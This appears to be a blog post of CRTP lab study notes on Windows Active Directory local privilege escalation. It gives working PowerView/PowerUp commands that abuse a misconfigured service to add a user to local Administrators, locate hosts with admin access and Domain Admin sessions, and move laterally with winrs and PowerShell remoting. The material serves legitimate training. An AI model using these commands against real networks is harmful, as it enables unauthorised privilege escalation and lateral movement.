---
title: Active Directory (AD) | Local Privilege Escalation (Part 1)
date: 2024-06-25 7:40:00 +0800
categories: [Cert, CRTP]
tags: [Cert, Active Directory]     ## TAG names should always be lowercase
render_with_liquid: false
render_with_liquid: false
description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
---


## Local Privilege Escalation

### Scenarios Leading to Privilege Escalation
 
 - Hunting for Local Admin Access: Gain local admin access on other machines.
 - Hunting for High Privilege Domain Accounts: Target accounts like Domain Administrator.
 - Example Scenario : 
    1. I have local admin access on a machine
    2. A Domain Admin has a session on that machine
    3. I steal his token and impersonate him
    4. Profit!

### Methods of Local Privilege Escalation on Windows
 
 - Missing Patches
 - Automated Deployment and AutoLogon password in clear text
 - AlwaysInstallElevated (Any user can run MSI on SYSTEM)
 - Misconfigured Services
 - DLL Hijacking and more
 - NTLM Relaying a.k.a Wont’t Fix
 - NTLM Relaying example - https://github.com/antonioCoco/RemotePotato0

### Essential Tools for Complete Coverage
 
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
 - https://github.com/enjoiz/Privesc
 - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md - Very NOISY

## Step 1: Check for Privilege Escalation Paths

**Tools Used:** PowerView

Start by checking for any privilege escalation paths. If any services can be abused, add your domain user to the local admin group.

### Check for any priviliege escalation path
```bash
Invoke-AllChecks
```
![Result](/img/crtp/result1.png){: width="972" height="589" }
_Invoke-AllChecks_


### Abusing Services
Add your current domain user to the local Administrators group.

```bash
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```

![Result](/img/crtp/result2.png){: width="972" height="589" }
_Invoke-AllChecks_

Now, our user is a local admin !

## Step 2: Identify Machines with Local Admin Access

**Tools Used:** Find-PSRemotingLocalAdminAccess.ps1

Next, identify any computers/machines in the domain where our user has local administrative access.

### Identifying Computers with Local Admin Access

```bash
Find-PSRemotingLocalAdminAccess
```
![Result](/img/crtp/result3.png){: width="972" height="589" }

We can connect to the machine with local administrative access using winrs or powershell remoting.
### Using winrs
```bash
winrs -r:dcorp-adminsrv cmd
set username
set computername
```
![Result](/img/crtp/result4.png){: width="972" height="589" }

### PowerShell Remoting
```bash
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```
![Result](/img/crtp/result5.png){: width="972" height="589" }

## Step 3: Identify Machines with Domain Admin Sessions

**Tools Used:** PowerView

Send a request to the Domain Controller to retrieve all ComputerName and membership of the domain admin's group with an admin session.

### Finding Domain User Locations
```bash
Find-DomainUserLocation
```
![Result](/img/crtp/result6.png){: width="972" height="589" }

Now, we can abuse this using winrs or PowerShell Remoting!

**Abuse using winrs**
![Result](/img/crtp/result7.png){: width="972" height="589" }